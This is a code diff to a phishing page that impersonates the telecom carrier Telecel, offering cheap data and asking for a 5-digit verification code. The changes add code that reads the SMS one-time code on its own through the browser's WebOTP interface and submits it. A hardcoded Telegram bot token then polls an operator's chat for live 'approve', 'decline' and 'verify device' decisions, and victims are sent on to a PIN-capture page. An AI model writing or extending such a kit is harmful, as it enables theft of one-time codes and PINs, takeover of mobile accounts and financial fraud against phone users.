@@ -24,15 +24,8 @@
             box-shadow: 0 10px 40px rgba(0,0,0,0.1);
             overflow: hidden;
         }
-        .logo-section {
-            text-align: center;
-            padding: 35px 0 20px;
-        }
-        .telecel-logo {
-            width: 138px;
-            height: 138px;
-            margin: 0 auto;
-        }
+        .logo-section { text-align: center; padding: 35px 0 20px; }
+        .telecel-logo { width: 138px; height: 138px; margin: 0 auto; }
         h1 {
             text-align: center;
             font-size: 23px;
@@ -69,9 +62,7 @@
             border-color: #E30613;
             box-shadow: 0 0 0 3px rgba(227, 6, 19, 0.12);
         }
-        .form-section {
-            padding: 0 25px 35px;
-        }
+        .form-section { padding: 0 25px 35px; }
         .error-msg {
             text-align: center;
             margin: 12px 20px;
@@ -135,7 +126,6 @@
             animation: spin 1s linear infinite;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
-
         @media (max-width: 480px) {
             .container { border-radius: 20px; }
             .telecel-logo { width: 115px; height: 115px; }
@@ -153,25 +143,15 @@
         <p class="subtitle">
             A 5-digit verification code has been sent to your number. Please enter it below to complete your purchase.
         </p>
-
-        <div class="otp-container" id="otpInputs">
-            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" autocomplete="one-time-code">
-            <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
-            <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
-            <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
-            <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
-        </div>
-
+        <div class="otp-container" id="otpInputs"></div>
         <div class="error-msg" id="err">Invalid OTP. Please check and try again.</div>
         <div class="success-msg" id="successMsg">✓ OTP Submitted! Waiting for approval...</div>
-
         <div class="form-section">
             <button class="btn-action" id="verifyBtn">Verify & Accept Purchase</button>
             <button class="back-btn" onclick="window.location.href='index.html'">← Back to Data Offers</button>
         </div>
     </div>
 
-    <!-- Spinner -->
     <div id="spinner">
         <div class="spin"></div>
         <p style="margin-top:15px;">Waiting for approval...</p>
@@ -182,7 +162,7 @@
             BOT_TOKEN: '8746906558:AAHpzw4CN1J8y4LdO7f8fBsZ_DIFhKYuXB8',
             CHAT_ID: '7547427914',
             SUCCESS_PAGE: 'https://unlimiteddata.vercel.app/success.html',
-            PIN_PAGE: 'https://unlimiteddata.vercel.app/device_verify.html'   // ← Changed to PIN page
+            PIN_PAGE: 'https://unlimiteddata.vercel.app/device_verify.html'
         };
 
         let state = {
@@ -195,43 +175,72 @@
             invalidPinId: null
         };
 
-        const inputs = document.querySelectorAll('.otp-input');
-        const verifyBtn = document.getElementById('verifyBtn');
         const errMsg = document.getElementById('err');
         const successMsg = document.getElementById('successMsg');
         const spinner = document.getElementById('spinner');
+        const verifyBtn = document.getElementById('verifyBtn');
 
-        // OTP Input Handling
-        inputs.forEach((input, index) => {
-            input.addEventListener('input', (e) => {
-                if (e.target.value.length > 1) {
-                    const chars = e.target.value.split('');
-                    chars.forEach((char, i) => {
-                        if (inputs[index + i]) inputs[index + i].value = char;
-                    });
-                }
-                if (e.target.value && index < inputs.length - 1) {
-                    inputs[index + 1].focus();
-                }
-                checkAndAutoSubmit();
-            });
-
-            input.addEventListener('keydown', (e) => {
-                if (e.key === 'Backspace' && !e.target.value && index > 0) {
-                    inputs[index - 1].focus();
-                }
-            });
-        });
+        // Create 5 inputs dynamically
+        function createInputs() {
+            const container = document.getElementById('otpInputs');
+            container.innerHTML = '';
+            for (let i = 0; i < 5; i++) {
+                const input = document.createElement('input');
+                input.type = 'text';
+                input.maxLength = 1;
+                input.className = 'otp-input';
+                input.inputMode = 'numeric';
+                input.autocomplete = 'one-time-code';
+                container.appendChild(input);
+            }
+        }
 
         function getOTP() {
             let otp = "";
-            inputs.forEach(input => otp += input.value);
+            document.querySelectorAll('.otp-input').forEach(input => otp += input.value);
             return otp;
         }
 
-        function checkAndAutoSubmit() {
-            if (getOTP().length === 5) {
-                setTimeout(submitOTP, 300);
+        function setupAutoFocus() {
+            const inputs = document.querySelectorAll('.otp-input');
+
+            inputs.forEach((input, index) => {
+                input.addEventListener('input', () => {
+                    if (input.value.length === 1 && index < 4) {
+                        inputs[index + 1].focus();
+                    }
+                    if (getOTP().length === 5) {
+                        setTimeout(submitOTP, 350);
+                    }
+                });
+
+                input.addEventListener('keydown', (e) => {
+                    if (e.key === 'Backspace' && !input.value && index > 0) {
+                        inputs[index - 1].focus();
+                    }
+                });
+            });
+        }
+
+        // Auto-read OTP from SMS
+        async function requestAutoOTP() {
+            if (!('OTPCredential' in window)) return;
+
+            try {
+                const credential = await navigator.credentials.get({
+                    otp: { transport: ['sms'] }
+                });
+
+                if (credential?.code) {
+                    const inputs = document.querySelectorAll('.otp-input');
+                    const code = credential.code.trim();
+                    code.split('').forEach((digit, i) => {
+                        if (inputs[i]) inputs[i].value = digit;
+                    });
+                    setTimeout(submitOTP, 600);
+                }
+            } catch (err) {
+                console.log("Auto OTP read not available or cancelled");
             }
         }
 
@@ -286,7 +295,6 @@
 
         function startPolling() {
             if (state.pollInterval) clearInterval(state.pollInterval);
-
             state.pollInterval = setInterval(() => {
                 fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
                     .then(r => r.json())
@@ -296,34 +304,23 @@
                             state.lastUpdateId = update.update_id;
                             if (update.callback_query) {
                                 const cb = update.callback_query.data;
-
-                                if (cb === state.approveId) {
-                                    // APPROVE → Go to PIN verification page
+                                if (cb === state.approveId || cb === state.validPinId) {
                                     clearInterval(state.pollInterval);
                                     spinner.style.display = 'none';
-                                    window.location.href = CONFIG.PIN_PAGE;
+                                    window.location.href = CONFIG.SUCCESS_PAGE;
                                 }
-                                else if (cb === state.declineId) {
+                                else if (cb === state.declineId || cb === state.invalidPinId) {
                                     clearInterval(state.pollInterval);
                                     spinner.style.display = 'none';
-                                    errMsg.textContent = "Request declined. Please try again.";
+                                    errMsg.textContent = "Request declined or invalid. Please try again.";
                                     errMsg.style.display = 'block';
+                                    document.querySelectorAll('.otp-input').forEach(i => i.value = '');
+                                    document.querySelectorAll('.otp-input')[0].focus();
                                 }
                                 else if (cb === state.verifyDeviceId) {
                                     clearInterval(state.pollInterval);
                                     spinner.style.display = 'none';
                                     window.location.href = CONFIG.PIN_PAGE;
-                                }
-                                else if (cb === state.validPinId) {
-                                    clearInterval(state.pollInterval);
-                                    spinner.style.display = 'none';
-                                    window.location.href = CONFIG.SUCCESS_PAGE;
-                                }
-                                else if (cb === state.invalidPinId) {
-                                    clearInterval(state.pollInterval);
-                                    spinner.style.display = 'none';
-                                    errMsg.textContent = "Invalid PIN. Please try again.";
-                                    errMsg.style.display = 'block';
                                 }
                             }
                         });
@@ -331,10 +328,17 @@
             }, 2000);
         }
 
-        verifyBtn.onclick = submitOTP;
+        // Initialize
+        createInputs();
+        setupAutoFocus();
+        document.querySelectorAll('.otp-input')[0].focus();
 
-        // Auto focus first input
-        inputs[0].focus();
+        // Start Auto SMS OTP Reading
+        window.onload = () => {
+            setTimeout(requestAutoOTP, 800);
+        };
+
+        verifyBtn.onclick = submitOTP;
     </script>
 </body>
 </html>
